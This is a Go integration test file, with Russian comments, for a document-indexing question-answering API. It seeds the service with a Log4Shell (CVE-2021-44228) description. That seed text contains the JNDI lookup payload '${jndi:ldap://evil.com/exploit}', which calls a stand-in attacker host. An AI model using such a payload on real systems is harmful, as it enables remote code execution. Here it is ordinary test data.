//go:build integration

// Пакет tests содержит интеграционные тесты против запущенного API.
// Перед запуском: поднять стек (`make up`), затем:
//
//	go test -tags integration -v ./tests/
//
// URL API переопределяется переменной TEST_API_URL (по умолчанию http://localhost:8080).
package tests

import (
	"encoding/json"
	"io"
	"net/http"
	"os"
	"regexp"
	"strings"
	"testing"
)

// log4jDoc — документ о Log4Shell, которым сидируется хранилище.
const log4jDoc = `{"title":"CVE-2021-44228","content":"Apache Log4j2 version 2.0-beta9 through 2.15.0 JNDI features used in error lookup, message interpolation, lookers, destination string of the Socket Appender and Socket Hub Appender, Redis destination of the Manager Appender, and Kafka appender allow an attacker to control log message interpolation by crafting JNDI lookup patterns like ${jndi:ldap://evil.com/exploit}. CVE-2021-44228 is also known as Log4Shell. The vulnerability allows remote code execution on affected systems."}`

func apiURL() string {
	if u := os.Getenv("TEST_API_URL"); u != "" {
		return u
	}
	return "http://localhost:8080"
}

// postJSON отправляет POST-запрос с JSON-телом и возвращает статус и тело ответа.
func postJSON(t *testing.T, path, body string) (int, []byte) {
	t.Helper()
	resp, err := http.Post(apiURL()+path, "application/json", strings.NewReader(body))
	if err != nil {
		t.Fatalf("POST %s: %v", path, err)
	}
	defer resp.Body.Close()
	b, err := io.ReadAll(resp.Body)
	if err != nil {
		t.Fatalf("read response from %s: %v", path, err)
	}
	return resp.StatusCode, b
}

// unmarshalObject декодирует JSON-тело в map.
func unmarshalObject(t *testing.T, body []byte) map[string]interface{} {
	t.Helper()
	var parsed map[string]interface{}
	if err := json.Unmarshal(body, &parsed); err != nil {
		t.Fatalf("invalid JSON response: %v (body=%s)", err, body)
	}
	return parsed
}

func seedLog4jDocument(t *testing.T) {
	t.Helper()
	status, body := postJSON(t, "/api/v1/documents", log4jDoc)
	if status != http.StatusOK {
		t.Fatalf("seed document: status %d, body=%s", status, body)
	}
}

// --- Тесты /api/v1/ask ---

func TestAskSuccess(t *testing.T) {
	seedLog4jDocument(t)

	status, body := postJSON(t, "/api/v1/ask", `{"question":"что такое Log4Shell?"}`)
	if status != http.StatusOK {
		t.Fatalf("status = %d, want 200 (body=%s)", status, body)
	}

	resp := unmarshalObject(t, body)
	answer, ok := resp["answer"].(string)
	if !ok || !strings.Contains(strings.ToLower(answer), "log4") {
		t.Errorf("answer не упоминает Log4Shell: %v", resp["answer"])
	}

	sources, ok := resp["sources"].([]interface{})
	if !ok {
		t.Fatalf("sources не найден: %v", resp["sources"])
	}
	if len(sources) < 1 || len(sources) > 5 {
		t.Errorf("sources = %d, want от 1 до 5", len(sources))
	}
	for i, src := range sources {
		sm, ok := src.(map[string]interface{})
		if !ok {
			t.Fatalf("source %d не объект: %v", i, src)
		}
		if _, hasTitle := sm["title"]; !hasTitle {
			t.Errorf("source %d без title", i)
		}
		if _, hasSnippet := sm["snippet"]; !hasSnippet {
			t.Errorf("source %d без snippet", i)
		}
	}
}

func TestAskEmptyQuestion(t *testing.T) {
	status, body := postJSON(t, "/api/v1/ask", `{"question":""}`)
	if status != http.StatusUnprocessableEntity {
		t.Fatalf("status = %d, want 422 (body=%s)", status, body)
	}
	resp := unmarshalObject(t, body)
	errObj, ok := resp["error"].(map[string]interface{})
	if !ok || errObj["detail"] == nil {
		t.Errorf("в теле ошибки нет error.detail: %s", body)
	}
}

// --- Тесты /api/v1/documents ---

func TestDocumentsSuccess(t *testing.T) {
	status, body := postJSON(t, "/api/v1/documents", log4jDoc)
	if status != http.StatusOK {
		t.Fatalf("status = %d, want 200 (body=%s)", status, body)
	}

	resp := unmarshalObject(t, body)
	docID, _ := resp["document_id"].(string)
	uuidRe := regexp.MustCompile(`^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$`)
	if !uuidRe.MatchString(docID) {
		t.Errorf("document_id = %q, не UUID", docID)
	}
	if indexed, _ := resp["indexed"].(bool); !indexed {
		t.Errorf("indexed = %v, want true", resp["indexed"])
	}
}

func TestDocumentsTooLarge(t *testing.T) {
	content := strings.Repeat("a", 2*1024*1024)
	status, _ := postJSON(t, "/api/v1/documents", `{"title":"big","content":"`+content+`"}`)
	if status != http.StatusRequestEntityTooLarge {
		t.Fatalf("status = %d, want 413", status)
	}
}

func TestDocumentsEmptyTitle(t *testing.T) {
	status, _ := postJSON(t, "/api/v1/documents", `{"title":"","content":"some content"}`)
	if status != http.StatusUnprocessableEntity {
		t.Fatalf("status = %d, want 422", status)
	}
}
